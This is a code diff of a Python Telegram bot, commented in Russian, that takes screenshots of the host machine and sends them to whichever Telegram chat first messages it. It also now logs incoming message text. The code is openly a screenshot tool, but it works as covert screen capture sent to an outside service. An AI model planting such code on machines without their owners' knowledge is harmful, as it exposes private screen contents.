@@ -7,9 +7,9 @@ from telegram import Bot, Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
 # Токен Telegram-бота
-TOKEN = "your token"
+TOKEN = ""
 bot = Bot(token=TOKEN)
-gpt_token = ""
+
 
 
 # Тут будет сохраняться chat_id
@@ -23,12 +23,11 @@ async def send_screenshot_async():
         return
 
     screenshot = ImageGrab.grab()
-    buf = BytesIO()
-    screenshot.save(buf, format="PNG")
-    buf.seek(0)
+    screenshot.save("screen.png", quality=95)
 
-    await bot.send_photo(chat_id=chat_id, photo=f)
-    print("✅ Скриншот отправлен!")
+    with open("screen.png", "rb") as f:
+        await bot.send_photo(chat_id=chat_id, photo=f)
+        print("✅ Скриншот отправлен!")
 
 def send_screenshot():
     loop = event_loop_holder["loop"]
@@ -41,12 +40,15 @@ def send_screenshot():
 # 📥 Обработчик входящих сообщений
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
+    text = update.message.text
+
+    print(f"[{chat_id}] Пользователь написал: {text}")  # 👈 сюда вывод
+
     if not chat_id_holder["chat_id"]:
         chat_id_holder["chat_id"] = chat_id
         await update.message.reply_text("📸 Привет! Теперь я могу отправлять тебе скриншоты.")
         print(f"🔗 chat_id сохранён: {chat_id}")
-    else:
-        await update.message.reply_text("✅ Я уже знаю твой chat_id. не пиши мне больше")
+
 
 # 👂 Запуск Telegram-бота в отдельном потоке
 
